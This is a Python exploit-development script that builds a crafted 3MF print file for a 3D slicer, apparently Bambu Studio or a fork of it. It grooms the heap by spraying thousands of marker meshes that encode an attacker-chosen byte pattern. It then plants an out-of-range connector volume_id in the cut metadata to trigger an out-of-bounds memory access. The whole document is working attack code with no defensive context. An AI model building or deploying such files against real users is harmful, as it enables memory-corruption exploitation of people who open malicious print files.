#!/usr/bin/env python3
# Adjacent-allocation grooming 3mf: cut object with N_VOL volumes (backing = N_VOL*8),
# plus many marker meshes sized to the SAME heap size-class, so markers sit in the same
# sub-segment as the volumes-vector backing (bounded proximity, not far-spray jitter).
import sys, os, zipfile, struct
TEMPLATE="/tmp/win/evil.3mf"; OUT="/tmp/qidiwork/adj.3mf"
vid    = int(sys.argv[1]) if len(sys.argv)>1 else 134217728
mark   = sys.argv[2] if len(sys.argv)>2 else "4141414141414141"
N_VOL  = int(sys.argv[3]) if len(sys.argv)>3 else 512      # volumes in cut object
N_SPRAY= int(sys.argv[4]) if len(sys.argv)>4 else 3000     # marker meshes
marker=bytes.fromhex(mark); assert len(marker)==8
# marker mesh vertex count so buffer bytes ~= N_VOL*8 (same size class as vector backing)
VTX = max(3, (N_VOL*8)//12)
VTX -= VTX%3
def coord_floats(vi):
    b=bytes(marker[(12*vi+j)%8] for j in range(12)); return struct.unpack('<fff',b)
def tiny_cube(oid):
    # minimal 1-triangle mesh = 1 volume when used as a component
    vs='<vertex x="0" y="0" z="0"/><vertex x="1" y="0" z="0"/><vertex x="0" y="1" z="0"/><vertex x="0" y="0" z="1"/>'
    ts='<triangle v1="0" v2="1" v3="2"/><triangle v1="0" v2="1" v3="3"/><triangle v1="0" v2="2" v3="3"/><triangle v1="1" v2="2" v3="3"/>'
    return f'<object id="{oid}" type="model"><mesh><vertices>{vs}</vertices><triangles>{ts}</triangles></mesh></object>'
def marker_mesh(oid):
    vs=''.join('<vertex x="%r" y="%r" z="%r"/>'%coord_floats(vi) for vi in range(VTX))
    ts=''.join(f'<triangle v1="{t}" v2="{t+1}" v3="{t+2}"/>' for t in range(0,VTX-2,3))
    return f'<object id="{oid}" type="model"><mesh><vertices>{vs}</vertices><triangles>{ts}</triangles></mesh></object>'
# volume-source mesh objects 1..N_VOL ; cut object 900000 with N_VOL components ; spray 100000..
volobjs=''.join(tiny_cube(i) for i in range(1,N_VOL+1))
comps='<components>'+''.join(f'<component objectid="{i}"/>' for i in range(1,N_VOL+1))+'</components>'
cutobj=f'<object id="900000" type="model">{comps}</object>'
sprayobjs=''.join(marker_mesh(100000+i) for i in range(N_SPRAY))
resources=volobjs+cutobj+sprayobjs
build='<item objectid="900000" transform="1 0 0 0 1 0 0 0 1 10 10 0.1" printable="1"/>'
build+=''.join(f'<item objectid="{100000+i}" transform="1 0 0 0 1 0 0 0 1 10 10 0.1" printable="1"/>' for i in range(N_SPRAY))
model=('<?xml version="1.0" encoding="UTF-8"?>\n'
 '<model unit="millimeter" xml:lang="en-US" xmlns="http://schemas.microsoft.com/3dmanufacturing/core/2015/02" '
 'xmlns:BambuStudio="http://schemas.bambulab.com/package/2021">\n'
 '<metadata name="BambuStudio:3mfVersion">1</metadata>\n'
 f'<resources>{resources}</resources>\n<build>{build}</build>\n</model>')
cut=('<?xml version="1.0" encoding="utf-8"?>\n<objects>\n'
     ' <object id="1">\n  <cut_id id="0" check_sum="1" connectors_cnt="1"/>\n  <connectors>\n'
     f'   <connector volume_id="{vid}" type="0" radius="8391460.0" height="8391460.0" r_tolerance="8391460.0" h_tolerance="8391460.0"/>\n'
     '  </connectors>\n </object>\n</objects>\n')
zin=zipfile.ZipFile(TEMPLATE,"r")
if os.path.exists(OUT): os.remove(OUT)
zout=zipfile.ZipFile(OUT,"w",zipfile.ZIP_DEFLATED)
done=set()
for it in zin.infolist():
    nm=it.filename; data=zin.read(nm)
    if nm=="3D/3dmodel.model": data=model.encode()
    elif nm=="Metadata/cut_information.xml": data=cut.encode()
    elif nm.startswith("3D/Objects/"): continue  # drop external object files (inline now)
    elif nm=="3D/_rels/3dmodel.model.rels": data=b'<?xml version="1.0" encoding="UTF-8"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>'
    zout.writestr(it, data); done.add(nm)
zin.close(); zout.close()
print(f"built {OUT}: vid={vid} N_VOL={N_VOL} VTX={VTX} (~{VTX*12}B) N_SPRAY={N_SPRAY} size={os.path.getsize(OUT)}")
